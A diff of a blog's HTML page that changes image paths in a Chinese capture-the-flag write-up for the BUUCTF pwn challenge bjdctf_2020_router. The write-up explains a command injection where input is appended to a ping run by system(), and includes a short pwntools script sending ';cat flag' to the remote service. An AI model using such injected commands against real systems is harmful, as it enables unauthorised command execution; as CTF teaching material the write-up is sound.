@@ -37,8 +37,8 @@
 <h1 id="buuctf-pwn-bjdctf_2020_router">BUUCTF Pwn Bjdctf_2020_router</h1>
 <p>考点：</p>
 <p>Linux命令执行基础</p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200518181843168.png" alt="image-20200518181843168"></p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200518182224441.png" alt="image-20200518182224441"></p>
+<p><img src="/images/image-20200518181843168.png" alt="image-20200518181843168"></p>
+<p><img src="/images/image-20200518182224441.png" alt="image-20200518182224441"></p>
 <p>将我们的输入拼接到dest处，然后执行system，所以直接输入&rdquo;;cat flag&quot;分割前面的ping，执行cat flag</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
 <span style="color:#75715e">#-*- coding=UTF-8 -*-</span>
@@ -49,7 +49,7 @@ sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></spa
 sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">choose:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#34;</span>)
 sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">address:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">;cat flag</span><span style="color:#e6db74">&#34;</span>)
 sh<span style="color:#f92672">.</span>interactive()
-</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200518182015942.png" alt="image-20200518182015942"></p>
+</code></pre></div><p><img src="/images/image-20200518182015942.png" alt="image-20200518182015942"></p>
 
 </main>
 
